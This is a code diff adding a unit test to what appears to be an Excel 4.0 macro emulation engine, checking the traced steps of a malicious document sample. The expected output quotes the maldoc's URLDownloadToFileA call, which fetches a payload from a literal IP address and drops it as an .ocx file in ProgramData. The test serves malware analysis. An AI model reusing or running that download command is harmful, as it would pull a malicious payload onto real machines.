@@ -149,6 +149,22 @@ class TestXlmEngineTraces(TestBase):
             ('Tiposa1', 30, 7, 'RETURN()'),
         )
 
+    def test_the_maldoc_run_spells_the_paths_it_downloads(self):
+        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
+        self.assertEqual(
+            [
+                (step.sheet, step.row)
+                for step in steps
+                if 'Ropedjo1.ocx' in step.text
+            ],
+            [('Xwtrd', 21), ('Tiposa1', 22)],
+        )
+        self.assertEqual(
+            steps[8].text,
+            '=uRlMon.URLDownloadToFileA(0,'
+            '"http://94.140.112.209/5783027620089514.dat","C:\\ProgramData\\Ropedjo1.ocx",0,0)',
+        )
+
 
 class TestXlmEngineControl(TestBase):
 
